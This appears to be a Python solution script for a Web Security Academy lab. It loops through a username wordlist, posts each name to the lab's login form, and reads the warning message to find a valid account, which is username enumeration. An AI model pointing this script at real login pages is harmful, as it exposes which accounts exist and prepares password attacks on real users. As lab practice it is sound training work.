import requests
from bs4 import BeautifulSoup

# s object emulates a browser session
s = requests.Session()

# grab unique session id and add it below
site = '0a81007a04c208938028b8f600130026.web-security-academy.net'

# construct the login-url for the site we wish to access
login_url = f'''https://{site}/login'''

# read the username file and add all the lines into a list
lines = open("auth-lab-usernames","r").readlines()

# encode the username and passsword for the login attempts in a dictionary format
for user in lines:
    target = user.strip()
    logindata = {
        'username' : target,
        'password' : 'foo'
    }

    # using our session, POST the form to the login url, attempting to login as the username
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text,'html.parser')

    warning = soup.find('p', {'class': 'is-warning'})
    if warning is None:
        print(f'username is {target}')
        break
    elif 'username' not in warning.text:
        print(f'username is {target}')
        break

    # noting the <p> 'is-warning' tab to see if the username is valid
    if warning is None:
        print(f'username is {target}')
        break